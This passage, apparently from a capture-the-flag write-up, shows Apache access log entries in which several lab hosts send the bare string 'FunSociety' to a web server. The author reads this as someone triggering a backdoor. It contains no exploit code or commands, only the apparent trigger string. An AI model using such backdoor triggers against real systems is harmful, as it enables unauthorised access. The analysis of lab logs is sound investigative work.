127.0.0.1 - - [25/Dec/2017:13:11:04 -0800] "FunSociety" 400 0 "-" "-"
10.10.10.80 - - [25/Dec/2017:13:11:22 -0800] "FunSociety" 400 0 "-" "-"
10.10.10.80 - - [25/Dec/2017:13:11:32 -0800] "42PA" 400 0 "-" "-"
10.10.10.80 - - [25/Dec/2017:13:11:46 -0800] "FunSociety" 400 0 "-" "-"
::1 - - [25/Dec/2017:13:13:12 -0800] "FunSociety" 400 0 "-" "-"
::1 - - [25/Dec/2017:13:13:52 -0800] "FunSociety" 400 0 "-" "-"
::1 - - [25/Dec/2017:13:13:55 -0800] "FunSociety" 400 0 "-" "-"
::1 - - [25/Dec/2017:13:14:00 -0800] "FunSociety" 400 0 "-" "-"
10.10.14.3 - - [25/Dec/2017:13:14:53 -0800] "FunSociety" 400 0 "-" "-"
10.10.14.3 - - [25/Dec/2017:13:15:13 -0800] "GET / HTTP/1.0" 200 4426 "-" "-"

```

Someone (maybe whiterose?) is accessing that backdoor.